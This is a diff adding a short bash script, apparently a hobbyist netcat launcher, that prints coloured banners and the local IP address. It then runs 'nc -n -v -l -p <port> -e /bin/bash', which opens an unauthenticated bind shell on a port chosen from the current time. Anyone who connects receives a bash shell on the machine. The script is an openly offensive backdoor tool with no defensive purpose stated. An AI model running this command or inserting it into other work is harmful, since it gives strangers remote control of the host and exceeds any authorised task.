@@ -1,0 +1,40 @@
+#! /bin/bash/
+pw="$(pwd)"
+ama='\033[33m'
+
+roj='\033[1;31m'
+
+fin='\033[01;37m'
+
+
+ip="$(ip route show|grep ' src ' |cut -d' ' -f9)"
+
+#tim="$(date +99%S)"
+
+xcc="$(date +'99%S')"
+clear
+echo "
+
+
+$ama
+    ＣｏｎｅＸｉｏｎ  A c t i v a：：：
+$fin
+
+
+          П e T ᑕ a T  -n -v -l -p $xcc
+
+                $roj
+"                            
+
+#	echo ""
+#clear
+
+
+toilet --metal -f future netcat...	
+echo ""
+cat /xg/0r/.betas/bann/bancatt
+echo "
+ $ip
+"
+nc -n -v -l -p $xcc -e /bin/bash
+
